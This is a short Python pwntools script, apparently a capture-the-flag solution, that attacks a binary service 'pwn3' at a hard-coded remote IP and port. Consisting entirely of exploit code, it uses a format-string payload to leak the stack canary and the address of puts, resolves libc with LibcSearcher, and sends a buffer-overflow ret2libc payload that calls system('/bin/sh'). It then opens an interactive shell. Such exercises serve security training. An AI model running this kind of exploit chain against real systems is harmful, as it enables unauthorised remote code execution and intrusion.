from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'DEBUG'
format_print_addr = 0x40076e
puts_got = 0x601018
rdi_ret = 0x0000000000400913

#sh = process('./pwn3')
sh = remote('49.235.243.206' , 9003)
#gdb.attach(sh)
sh.recvuntil('Please tell me your name!')
payload = '%9$p,' + 'A' + '%13$p:'+ '%14$p;' + '%15$s,'+ p64(puts_got) + p64(format_print_addr) 
sh.sendline(payload)
sh.recvuntil('Hello ')
canary = int(sh.recvuntil(',')[:-1],16)
log.info('canary = ' + hex(canary))
sh.recvuntil(';')
puts_addr = u64(sh.recvuntil(',')[:-1].ljust(8,'\x00')) 
log.success('puts_addr = ' + hex(puts_addr))
libc =  LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
log.success('libc_base = ' + hex(libc_base) )
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'A' * 40 + p64(canary) + 'A' * 8 + p64(rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
sh.recvuntil('What do you want to do?')
sh.sendline(payload)
sh.interactive()